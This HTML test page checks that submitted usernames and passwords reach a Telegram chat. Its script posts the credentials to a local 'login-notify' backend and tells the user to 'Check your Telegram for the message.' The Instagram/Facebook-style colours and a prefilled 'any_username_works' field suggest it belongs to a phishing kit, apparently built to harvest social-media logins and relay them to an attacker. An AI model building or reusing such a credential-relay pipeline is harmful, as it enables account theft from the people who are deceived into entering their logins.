<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Login Notification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #1877f2;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 4px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <h1>üß™ Test Login Notification</h1>
    <p>Test if credentials are being sent to Telegram</p>

    <form id="testForm">
        <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required value="any_username_works">
        </div>

        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required value="test123456">
        </div>

        <button type="submit" id="submitBtn">Send Test Login</button>
    </form>

    <div id="result" class="result"></div>

    <script>
        const form = document.getElementById('testForm');
        const resultDiv = document.getElementById('result');
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            submitBtn.disabled = true;
            submitBtn.textContent = 'Sending...';
            resultDiv.style.display = 'none';

            try {
                console.log('Sending test login:', { username, password });

                const response = await fetch('http://localhost:3001/api/login-notify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString(),
                    }),
                });

                const data = await response.json();
                console.log('Response:', data);

                resultDiv.className = 'result success';
                resultDiv.textContent = '‚úÖ Success! Check your Telegram for the message.';
                resultDiv.style.display = 'block';

            } catch (error) {
                console.error('Error:', error);
                resultDiv.className = 'result error';
                resultDiv.textContent = '‚ùå Error: ' + error.message + '\n\nMake sure the backend server is running on port 3001!';
                resultDiv.style.display = 'block';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Send Test Login';
            }
        });

        // Check if server is running on load
        fetch('http://localhost:3001/health')
            .then(res => res.json())
            .then(data => {
                console.log('‚úÖ Server is running:', data);
            })
            .catch(err => {
                console.error('‚ùå Server is not running! Start it with: cd telegram-bot && npm run server');
                alert('‚ö†Ô∏è Backend server is not running!\n\nStart it with:\ncd telegram-bot\nnpm run server');
            });
    </script>
</body>
</html>
